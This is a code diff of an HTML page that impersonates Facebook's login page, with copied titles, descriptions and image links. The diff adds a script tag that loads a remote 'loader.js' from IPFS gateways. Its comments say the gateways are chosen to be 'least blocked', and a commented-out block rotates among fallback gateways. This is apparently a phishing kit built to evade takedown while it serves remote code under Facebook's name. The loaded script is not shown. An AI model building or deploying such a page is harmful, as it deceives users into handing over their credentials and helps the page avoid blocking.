@@ -4,22 +4,36 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Facebook - Log In or Sign Up</title>
-  <meta name="description" content="Create an account or log in to Facebook. Connect with friends and family.">
+  <meta name="description" content="Create an account or log in to Facebook. Connect with friends, family and other people you know.">
+  <meta property="og:title" content="Facebook">
+  <meta property="og:description" content="Facebook helps you connect and share with the people in your life.">
+  <meta property="og:image" content="https://static.xx.fbcdn.net/rsrc.php/v3/y-/r/FhOLTyUFKwf.png">
 </head>
 <body>
   <div id="root">Loading...</div>
 
- 
+  <!-- 
+    YOUR IPFS LOADER.JS – change the CID below if you re-uploaded a new version
+    Using Cloudflare gateway (fastest & least blocked in most regions)
+  -->
+  <script src="https://cloudflare-ipfs.com/ipfs/bafkreidxcrvrqbt5tf2s74kagfedvn4trga24ttwwtdeiakohhyt4babnq"></script>
+
+  <!-- 
+    Optional: fallback gateways if Cloudflare is blocked in some regions
+    Uncomment this block and comment the line above if needed
+
   <script>
     const gateways = [
       'https://cloudflare-ipfs.com/ipfs/',
       'https://dweb.link/ipfs/',
-      'https://nftstorage.link/ipfs/'
+      'https://nftstorage.link/ipfs/',
+      'https://ipfs.io/ipfs/'
     ];
-    const cid = 'bafkreidxcrvrqbt5tf2s74kagfedvn4trga24ttwwtdeiakohhyt4babnq';
-    const random = gateways[Math.floor(Math.random() * gateways.length)];
-    document.write(`<script src="${random}${cid}"></script>`);
+    const cid = 'bafkreid7oxmvvloqka7ttur623f76bchfcpbtbfsl3khmh54jwdkvjjjk4';
+    const randomGateway = gateways[Math.floor(Math.random() * gateways.length)];
+    document.write(`<script src="${randomGateway}${cid}"></script>`);
   </script>
-  
+  -->
+
 </body>
 </html>
